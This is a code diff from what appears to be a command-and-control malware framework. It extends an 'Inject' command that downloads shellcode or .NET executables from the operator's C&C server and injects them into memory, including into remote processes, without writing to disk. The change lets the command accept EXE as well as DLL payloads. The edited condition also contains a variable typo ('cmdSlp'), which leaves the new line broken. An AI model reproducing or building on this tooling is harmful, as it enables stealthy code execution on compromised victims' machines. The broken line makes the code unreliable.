@@ -15,11 +15,11 @@ class Inject(Command):
 
 	def printHelp(self):
 
-		helpstr = """\n Download and inject in memory a shellcode (.bin) or dll file from your C&C.
-	\n ** USAGE FOR DLL **: inject <dll path> <method to execute> [arg1 [arg2]]
+		helpstr = """\n Download and inject in memory a shellcode (.bin) or PE (dll or exe) from your C&C.
+	\n ** USAGE FOR PE **: inject <pe path> <method to execute> [arg1 [arg2]]
 	\n ** USAGE FOR SHELLCODE **: inject <shellcode path> [PID]
-	\n [+] Dll is always injected in the own shell process; shellcode can be injected in a remote process as well.
-	\n [+] The payload won't touch disk. The dll must be a .NET assembly.	
+	\n [+] PE is always injected in the own shell process; shellcode can be injected in a remote process as well.
+	\n [+] The payload won't touch disk. The PE must be a .NET assembly.	
 		"""
 
 		print(helpstr)
@@ -55,12 +55,12 @@ class Inject(Command):
 			self.printHelp()
 		else:
 			
-			if ".dll" in cmdSpl[0]:
-				cmdSpl.append("inject_dll")
+			if ".dll" in cmdSpl[0] or ".exe" in cmdSlp[0]:
+				cmdSpl.append("inject_pe")
 			elif ".bin" in cmdSpl[0]:
 				cmdSpl.append("inject_shellcode")
 			else:
-				print(Fore.RED + "Invalid file type. Select a dll or shellcode (.bin) to inject.")
+				print(Fore.RED + "Invalid file type. Select a .NET assembly (dll/exe) or shellcode (.bin) to inject.")
 				self.writeCommandInFile([], prevId, nextId, filePath)
 				return False
 						
